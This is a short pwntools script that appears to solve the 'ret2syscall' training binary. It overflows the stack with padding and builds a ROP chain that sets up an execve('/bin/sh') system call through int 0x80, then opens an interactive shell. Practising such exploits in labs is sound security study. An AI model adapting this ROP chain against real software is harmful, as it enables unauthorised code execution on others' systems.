from pwn import *

bin_addr = 0x080BE408
eax_addr = 0x080bb196
edx_ecx_ebx_addr = 0x0806eb90
int_80h_addr = 0x08049421
offset = 0xFF83D7E8-0xFF83D77C+4
padding = ( offset * b'A'\
			+ p32(eax_addr) + p32(0xb)\
			+ p32(edx_ecx_ebx_addr) + p32(0) + p32(0) + p32(bin_addr)\
			+ p32(int_80h_addr))

sh = process("./ret2syscall")
sh.sendline(padding)
sh.interactive()
